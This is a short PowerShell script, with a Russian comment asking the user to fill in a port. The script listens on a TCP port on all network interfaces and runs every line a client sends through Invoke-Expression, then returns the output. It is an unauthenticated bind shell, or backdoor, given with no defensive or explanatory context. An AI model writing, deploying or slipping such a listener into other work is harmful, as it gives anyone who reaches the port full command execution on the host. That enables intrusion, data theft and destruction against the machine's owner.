$listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, your-port) # замените 'your-port' на ваш порт
$listener.Start()

while ($true) {
   $client = $listener.AcceptTcpClient()
   $stream = $client.GetStream()
   $reader = New-Object System.IO.StreamReader($stream)
   $command = $reader.ReadLine()
   $result = Invoke-Expression $command 2>&1 | Out-String
   $writer = New-Object System.IO.StreamWriter($stream)
   $writer.WriteLine($result)
   $writer.Flush()
}
